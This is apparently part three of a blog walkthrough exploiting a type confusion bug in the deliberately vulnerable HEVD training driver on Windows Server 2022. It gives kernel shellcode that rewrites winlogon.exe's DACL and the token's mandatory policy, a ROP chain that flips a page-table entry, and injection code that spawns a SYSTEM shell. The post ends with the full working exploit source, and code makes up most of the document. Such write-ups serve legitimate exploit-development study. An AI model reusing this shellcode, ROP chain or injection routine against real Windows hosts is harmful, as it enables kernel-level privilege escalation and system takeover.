[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 2](https://plackyhacker.github.io/kernel/hevd-2)

# HEVD Type Confusion Walkthrough on Windows 2022 (Part 3)

In this final part I am going to concentrate on writing the shellcode that we execute in user space once `ret`ing from our ROP chain. Two common techniques are:

- Token Stealing.
- NULLint out ACLs.

Token stealing involves locating the `System` process, or another elevated process, and stealing the security token. We are actually referencing the high privilege token from our low privilege process, not stealing it. 

NULLing out ACLs doesn't actually work on Windows 10 1607 and above. Microsoft patched this. The OS will BSOD if the security descriptor of a privileged process is set to NULL. We can however change the ACL on a security descriptor to give our low privileged process access to the high privileged process to inject shellcode into it to spawn a privileged shell.

There's lots of resources online for writing token stealing shellcode, so I'm going to go the other route, I'll call this **Privileged Process Discretionary ACL Manipulation**. Yes, I've just made that up!

I first read about this [here](https://blog.improsec.com/tech-blog/windows-kernel-shellcode-on-windows-10-part-2), so I can't take any credit for the technique.

## Stopping Bugchecks

Recently I learned from [this blog](https://www.linkedin.com/safety/go?url=https%3A%2F%2Fwafzsucks.medium.com%2Fhow-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f&trk=flagship-messaging-web&messageThreadUrn=urn%3Ali%3AmessagingThread%3A2-NmRhNTQ0YTItNDAzYi00NDYzLWIzZDQtMjNiNThiOWZmYmI1XzAxMg%3D%3D&lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base%3B%2BbayF5W%2FTdqVBXlFeoIMxg%3D%3D) that trying to step through code when the stack is pivoted can be a pain, with bugchecks commonplace. So we can step through our shellcode without generating a BSOD, we should restore the stack as early as possible in our shellcode:

```
BITS 64
SECTION .text

global main

main:
restore_stack:
    ; restore stack early to avoid stack pivot debugging errors
    mov rsp, r11

; our main shellcode will go in here

the_end:
    ret
```

Remember from previous posts that we only have to move `r11` in to `rsp` to restore the stack. If we do this we can insert breakpoints in our shellcode and step through it now that the stack has been restored to its previous state.

### Process Hacker

Before we get started, on the target host use **Process Hacker** to examine the `winlogon.exe` process. You will need elevated privileges to do this:

<img width="1254" alt="image" src="https://github.com/user-attachments/assets/5b6e74fb-c47b-4e2d-bad7-d5030f7d43ee">

We can see that in order to get access to the process (to inject shellcode) we need to be either `SYSTEM` or and `Administrator` (with `High` Integrity). What we want to do is manipulate the permissions in the kernel so it allows us to inject shellcode into this privileged process. We will write shellcode that runs in our driver exploit to do just that.

## Shellcode

In this section I will use the `_KPROCESS` and `_EPROCESS` interchangably depending on what I think the context is; just be mindful that the `_KPROCESS` is a structure within the `_EPROCESS` at an offset of `0x0`.

### Finding KPROCESS

Lets start with the following:

```
BITS 64
SECTION .text
    ; OS Name:    Microsoft Windows Server 2022 Standard Evaluation
    ; OS Version: 10.0.20348 N/A Build 20348
    KTHREAD                 equ 0x188               ; Offset from GS register
    KPROCESS                equ 0xb8                ; _KAPC_STATE (0x98) + 0x20 = _KPROCESS
    ACTIVE_PROCESS_LINKS    equ 0x448               ; _LIST_ENTRY = _KPROCESS + 0x448
    IMAGE_FILE_NAME         equ 0x5a8               ; UChar = _KPROCESS + 0x5a8
    WINLOGON                equ 6e6f676f6c6e6977h   ; nogolniw
    SID_OFFSET              equ 0x48                ; where the last digiti of the SID is located
    AUTHENTICATED_USERS     equ 0x0b                ; Authenticated user SID byte
    TOKEN                   equ 0x4b8               ; _TOKEN offset from _KRPOCESS
    MANDATORY_POLICY        equ 0xd4                ; Policy offset from _TOKEN

global main

main:
restore_stack:
    ; restore stack early to avoid stack pivot debugging errors
    ; this is specific to the HEVD type confusion exploit
    mov rsp, r11
```

We will be using all of the symbols as we go through writing the shellcode. These just make it easier to adjust our shellcode for different environments where offsets might change.

To find the `_KPROCESS` structure for our exploit process in the kernel we use the following:

```
find_process:
    mov rax, [gs:KTHREAD]
    mov rax, [rax+KPROCESS]
    mov rcx, rax                        ; store the KPROCESS for later
    mov r8, rax
```

At on offset of `0x188` from the `gs` segment register is the `_KTHREAD` entry for the currently executing thread, which is within our exploit process. At an offset of `0xb8` is a ponter to the `_KPROCESS`. We take a copy of this location for later with the `mov rcx, rax`, and we also move it in to `r8` to use in the next section of our shellcode.

`r8`, `rcx`, and `rax` all point to the `_KPROCESS` (which is the first element of the `_EPROCESS` structure) of our exploit process.

### Locating winlogon.exe

We are going to ammend the DACL for the `winlogon.exe` process to allow us to inject shellcode in to it to elevate our privileges. The first thing we need to do is locate the `winlogon.exe` `_EPROCESS`:

```
next_process:
    mov r8, [r8+ACTIVE_PROCESS_LINKS]
    mov r8, [r8]            
    sub r8, ACTIVE_PROCESS_LINKS

    mov r9, r8
    add r9, IMAGE_FILE_NAME
    mov r10, WINLOGON
    cmp [r9], r10
    jnz next_process
```

Each `_EPROCESS` contains a cyclic, doubly-linked list, of all other processes running on the system, this is at offset `0x448` from the `_KPROCESS`. We reference the `ActiveProcessLinks` field using `mov r8, [r8+ACTIVE_PROCESS_LINKS]` and then dereference this (get the actual address ponted to) using `mov r8, [r8]`. Then we subtract `0x448` which places the address of the next process in the list in `r8`.

We `mov` `r8` into `r9` then add the offset of the `ImageFileName` field to `r9`, which is at an offset of `0x5a8` (remember `r9` points to the `_KPROCESS` of the next process). We `mov` the little endian ASCII representation of `winlogon` in to `r10` then compare this with the `QWORD` value pointed to by `r9` (which is the `ImageFileName` field).

If `r9` and `r10` **don't** match we jump back to `next_process` and start over, looping until we locate the `winlogon.exe` process.

**Fun Fact:** The linked list is circular, meaning when we get to the end it points back to the start, if we don't find `winlogon.exe` it will loop forever (in CPU terms). That is exactly what I did when I was debugging my code and made a mistake!

When the target process is found `r8` points to the `_KPROCESS` of `winlogon.exe` and `r9` points to the `ImageFileName` field of `winlogon.exe`. We will continue to use the `r9` register, but we could easily use the `r8` one.

### Patching the DACL

Lets continue with our shellcode, the next section amends the DACL in the security descriptor for the process:

```
amend_security_descriptor:
    sub r9, IMAGE_FILE_NAME
    sub r9, 0x8
    mov rax, [r9]
    and rax, 0xfffffffffffffff0
    add rax, SID_OFFSET
    mov byte [rax], AUTHENTICATED_USERS
```

First we locate the `winlogon.exe` `_KPROCESS` by subtracting `0x5a8` from `r9`. We subtract a further `0x8` bytes from `r9`. `r9` now contains a pointer for the **Security Descriptor** associated with the process. We dereference this address into `rax`.

The Security Descriptor address is actually an `_EX_FAST_REF` structure. This type of structure stores the actual address and the least significant 4 bits for metadata. To get the true address of the Security Descriptor we need to `and` the pointer with `0xfffffffffffffff0`, which effectively removes the 4 least significant bits (metadata).

We then `add` `0x48` to the Security Descriptor address, this is the offset of the bit we want to change.

The existing DACL in the Securituy Descriptor is set to `S-1-5-18` (`System`) and we want to change it to `S-1-5-11` (`Authenticated Users`); essentially we only want to change the last bit from `0x12` to `0xb`. We do this with the `mov byte` instruction.

### Patching the Mandatory Policy

The default `MandatoryPolicy` field in an access token for our user mode process is `TOKEN_MANDATORY_POLICY_VALID_MASK` (`0x3`). This field controls whether lower-integrity processes can modify higher-integrity objects or settings. This particular policy means a process associated with the token cannot write to objects that have a greater mandatory integrity level and it will inherit the lowest integrity level of either its parent process or the executable file.

We want to change this to `TOKEN_MANDATORY_POLICY_OFF` (`0x0`):

```
amend_mandatory_flag:
    add rcx, TOKEN
    mov rax, [rcx]
    and rax, 0xfffffffffffffff0
    add rax, MANDATORY_POLICY
    mov byte [rax], 0x00
```

Earlier we moved `rax` into `rcx`, this was the `_KPROCESS` address for our exploit process. We `add` `0x4b8` to this to get the `Token` field, we dereference this with `mov rax, [rcx]`. The `Token` is also a `_EX_FAST_REF` so we `and` out the 4 least significant bits. The `MandatoryPolicy` field is at an offset of `0xd4` in the `Token`. We modify this byte to `0x0` using the `mov byte` instruction.

When compiled our shellcode can be added to the exploit:

```c
char shellcode[] = {
  0x4c, 0x89, 0xdc, 0x65, 0x48, 0x8b, 0x04, 0x25, 
  0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 
  0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x49, 0x89, 
  0xc0, 0x4d, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 
  0x4d, 0x8b, 0x00, 0x49, 0x81, 0xe8, 0x48, 0x04, 
  0x00, 0x00, 0x4d, 0x89, 0xc1, 0x49, 0x81, 0xc1, 
  0xa8, 0x05, 0x00, 0x00, 0x49, 0xba, 0x77, 0x69, 
  0x6e, 0x6c, 0x6f, 0x67, 0x6f, 0x6e, 0x4d, 0x39, 
  0x11, 0x75, 0xd6, 0x49, 0x81, 0xe9, 0xa8, 0x05, 
  0x00, 0x00, 0x49, 0x83, 0xe9, 0x08, 0x49, 0x8b, 
  0x01, 0x48, 0x83, 0xe0, 0xf0, 0x48, 0x83, 0xc0, 
  0x48, 0xc6, 0x00, 0x0b, 0x48, 0x81, 0xc1, 0xb8, 
  0x04, 0x00, 0x00, 0x48, 0x8b, 0x01, 0x48, 0x83, 
  0xe0, 0xf0, 0x48, 0x05, 0xd4, 0x00, 0x00, 0x00, 
  0xc6, 0x00, 0x00, 0xc3
};
```

We can run the entire exploit and examine the `winlogon.exe` process:

<img width="1209" alt="image" src="https://github.com/user-attachments/assets/216888cd-2a4f-4ce0-8843-f9ab9463e2fd">


## Process Injection

Now we have the correct permissions to inject into `winlogon.exe` we can inject some shellcode into it. Our shellcode will spawn a child process (`cmd.exe`). This will inherit the token from `winlogon.exe` and we will have a privileged shell.

### Getting the PID of winlogon.exe

Here we will use a common technique to enumerate the PID of a process by name, I will not explain this code as it is fairly common:

```c
// helper function to find a PID by process name
DWORD GetPid(const WCHAR* processName)
{
    HANDLE hProcessSnapShot;
    PROCESSENTRY32 processEntry;
    DWORD result = 0;
    BOOL success;

    hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapShot == INVALID_HANDLE_VALUE) return FALSE;

    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnapShot, &processEntry))
    {
        CloseHandle(hProcessSnapShot);
        return(0);
    }

    do
    {
        if (0 == wcscmp(processName, processEntry.szExeFile))
        {
            result = processEntry.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnapShot, &processEntry));

    CloseHandle(hProcessSnapShot);

    return result;
}
```

### Locating WinExec and Shellcode

Our shellcode will use the Win32 API `WinExec` to spawn `cmd.exe`. The easiest way to call this function is to use Win32 APIs in our `C` code to resolve the address and then copy it to our shellcode. We resolve the address:

```c
FARPROC hModule = GetProcAddress(GetModuleHandleA("kernel32"), "WinExec");
printf("[+] WinExec: 0x%p\n", hModule);
```

We will use the following shellcode to `mov` the address of `WinExec` in to `r10` before calling it, notice that I have created a placeholder out of nops:

```
0//     0:  48 b8 00 65 78 65 2e    movabs rax, 0x006578652e646d63
//     7:  64 6d 63
//     a : 50                      push   rax
//     b : 48 89 e1                mov    rcx, rsp
//     c : 48 c7 c2 05 00 00 00    mov    rdx, 0x5
//    13 : 49 ba 30 86 71 c2 f8    movabs r10, 0x7ff8c2718630 <- example WinExec
//    1a : 7f 00 00
//    1d : 48 83 ec 38             sub    rsp,0x38
//    21 : 41 ff d2                call   r10
//    24 : 
char shellcode[] = {
  0x48, 0xb8, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, // cmd.exe
  0x50,
  0x48, 0x89, 0xe1,
  0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00,
  0x49, 0xba, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // nops are a placeholder for the address
  0x48, 0x83, 0xec, 0x30,
  0x41, 0xff, 0xd2,
  0x48, 0x83, 0xc4, 0x38,
  0xc3
};
```

Then we will copy the address of `WinExec` into the placeholder  once it is resolved:

```c
// Storing the address in a char array in little-endian order
char addressBytes[sizeof(FARPROC)];
uintptr_t addr = (uintptr_t)hModule;

for (size_t i = 0; i < sizeof(FARPROC); ++i) {
  addressBytes[i] = (char)((addr >> (i * 8)) & 0xFF);
}

// copy the bytes to the shellcode array, starting at index 23, for 8 bytes
memmove(shellcode + 23, addressBytes, 8);
```

### Win32 APIs

We can use a fairly standard user mode process injection workflow:

```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

if (hProcess)
{
  LPVOID alloc = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  if (alloc)
  {
    if (WriteProcessMemory(hProcess, alloc, &shellcode, sizeof(shellcode), NULL))
    {
       CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
    }
    else
    {
        printf("[!] Unable to write to the memory!\n");
        return;
    }
  }
  else
  {
    printf("[!] Unable to allocate memory!\n");
    return;
  }
}
else
{
  printf("[!] Unable to get a handle to the process!\n");
  return;
}

printf("[+] Enjoy your SYSTEM shell!\n");

FreeLibrary((HMODULE)hModule);
CloseHandle(hProcess);
```

We allocate some virtual memory in `winlogon.exe` using the `VirtualAllocEx` function, then write our shellcode to the allocated memory using `WriteProcessMemory`. Finally we use `CreateRemoteThread` to execute our shellcode.

## Final Exploit

We can run the final exploit and we get a privileged shell:

![image](https://github.com/user-attachments/assets/449d0c68-2e6d-41a7-bc32-def9dd817882)

I have included the full code below:

```c
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>
#include <tlhelp32.h> 

typedef uint64_t QWORD;

#define ARRAY_SIZE 1024

typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;

QWORD GetKernelBase()
{
    LPVOID drivers[ARRAY_SIZE];
    DWORD cbNeeded;
    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

    return (QWORD)drivers[0];
}


// helper function to find a PID by process name
DWORD GetPid(const WCHAR* processName)
{
    HANDLE hProcessSnapShot;
    PROCESSENTRY32 processEntry;
    DWORD result = 0;
    BOOL success;

    hProcessSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapShot == INVALID_HANDLE_VALUE) return FALSE;

    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnapShot, &processEntry))
    {
        CloseHandle(hProcessSnapShot);
        return(0);
    }

    do
    {
        if (0 == wcscmp(processName, processEntry.szExeFile))
        {
            result = processEntry.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnapShot, &processEntry));

    CloseHandle(hProcessSnapShot);

    return result;
}

void InjectShellcode()
{
    FARPROC hModule = GetProcAddress(GetModuleHandleA("kernel32"), "WinExec");
    printf("[+] WinExec: 0x%p\n", hModule);

    DWORD pid = GetPid(L"winlogon.exe");
    printf("[+] winlogon.exe PID: %d\n", pid);

    //     0:  48 b8 00 65 78 65 2e    movabs rax, 0x006578652e646d63
    //     7:  64 6d 63
    //     a : 50                      push   rax
    //     b : 48 89 e1                mov    rcx, rsp
    //     c : 48 c7 c2 05 00 00 00    mov    rdx, 0x5
    //    13 : 49 ba 30 86 71 c2 f8    movabs r10, 0x7ff8c2718630
    //    1a : 7f 00 00
    //    1d : 48 83 ec 38             sub    rsp,0x38
    //    21 : 41 ff d2                call   r10
    //    24 : 
    char shellcode[] = {
        0x48, 0xb8, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, // cmd.exe
        0x50,
        0x48, 0x89, 0xe1,
        0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00,
        0x49, 0xba, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // nops are a placeholder for the address
        0x48, 0x83, 0xec, 0x30,
        0x41, 0xff, 0xd2,
        0x48, 0x83, 0xc4, 0x38,
        0xc3
    };

    // Storing the address in a char array in little-endian order
    char addressBytes[sizeof(FARPROC)];
    uintptr_t addr = (uintptr_t)hModule;

    for (size_t i = 0; i < sizeof(FARPROC); ++i) {
        addressBytes[i] = (char)((addr >> (i * 8)) & 0xFF);
    }

    // copy the bytes to the shellcode array, starting at index 24, for 8 bytes
    memmove(shellcode + 23, addressBytes, 8);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

    if (hProcess)
    {
        LPVOID alloc = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (alloc)
        {
            if (WriteProcessMemory(hProcess, alloc, &shellcode, sizeof(shellcode), NULL))
            {
                CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
            }
            else
            {
                printf("[!] Unable to write to the memory!\n");
                return;
            }
        }
        else
        {
            printf("[!] Unable to allocate memory!\n");
            return;
        }
    }
    else
    {
        printf("[!] Unable to get a handle to the process!\n");
        return;
    }

    printf("[+] Enjoy your SYSTEM shell!\n");

    FreeLibrary((HMODULE)hModule);
    CloseHandle(hProcess);
}

int main(int argc, char* argv[]) {

    char shellcode[] = {
        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,

        0x4c, 0x89, 0xdc, 0x65, 0x48, 0x8b, 0x04, 0x25, 
        0x88, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x80, 0xb8, 
        0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0x49, 0x89, 
        0xc0, 0x4d, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 
        0x4d, 0x8b, 0x00, 0x49, 0x81, 0xe8, 0x48, 0x04, 
        0x00, 0x00, 0x4d, 0x89, 0xc1, 0x49, 0x81, 0xc1, 
        0xa8, 0x05, 0x00, 0x00, 0x49, 0xba, 0x77, 0x69, 
        0x6e, 0x6c, 0x6f, 0x67, 0x6f, 0x6e, 0x4d, 0x39, 
        0x11, 0x75, 0xd6, 0x49, 0x81, 0xe9, 0xa8, 0x05, 
        0x00, 0x00, 0x49, 0x83, 0xe9, 0x08, 0x49, 0x8b, 
        0x01, 0x48, 0x83, 0xe0, 0xf0, 0x48, 0x83, 0xc0, 
        0x48, 0xc6, 0x00, 0x0b, 0x48, 0x81, 0xc1, 0xb8, 
        0x04, 0x00, 0x00, 0x48, 0x8b, 0x01, 0x48, 0x83, 
        0xe0, 0xf0, 0x48, 0x05, 0xd4, 0x00, 0x00, 0x00, 
        0xc6, 0x00, 0x00, 0xc3
    };

    LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!alloc)
    {
        printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
        return 1;
    }

    printf("[+] Memory allocated: 0x%p\n", alloc);

    // copy the shellcode in to the memory
    RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
    printf("[+] Shellcode copied to: 0x%p\n", alloc);

    // get the base of the kernel
    QWORD kernelBase = GetKernelBase();
    printf("[+] Kernel base: 0x%p\n", kernelBase);

    // get a handle to the driver
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    // ROP Gadgets
    QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
    QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret;

    // stack pivoting gadgets/values
    QWORD STACK_PIVOT_ADDR = 0xF6000000;
    QWORD MOV_ESP = kernelBase + 0x28bdbb;                          // mov esp, 0xF6000000; ret;

    // prepare the new stack
    QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
    LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    printf("[+] User space stack, allocated address: 0x%p\n", stack);

    if (stack == 0x0)
    {
        printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
        return 1;
    }

    printf("[+] VirtualLock, address: 0x%p\n", stack);
    if (!VirtualLock((LPVOID)stack, 0x14000)) {
        printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
        return 1;
    }

    int index = 0;

    QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);

    *(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
    *(rop + index++) = (QWORD)alloc;
    *(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r10 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
                                                    // rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
                                                    // r8 = rcx = rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
    *(rop + index++) = (QWORD)0x4;
    *(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
                                                    // rcx = rax = modified PTE value

    *(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
                                                    // moves the modified PTE value to the PTE address

    *(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;

    // ret to user space shellcode
    *(rop + index++) = (QWORD)alloc;

    // allocate the userObject
    USER_TYPE_CONFUSION_OBJECT userObject = { 0 };
    userObject.ObjectID = (ULONG_PTR)0x4141414141414141;            // junk
    userObject.ObjectType = (ULONG_PTR)MOV_ESP;                     // the gadget to execute

    printf("[!] Press a key to trigger the bug...\n");
    getchar();

    // trigger the bug
    DeviceIoControl(hDriver, 0x222023, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);

    InjectShellcode();

    return 0;
}
```

[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 2](https://plackyhacker.github.io/kernel/hevd-2)
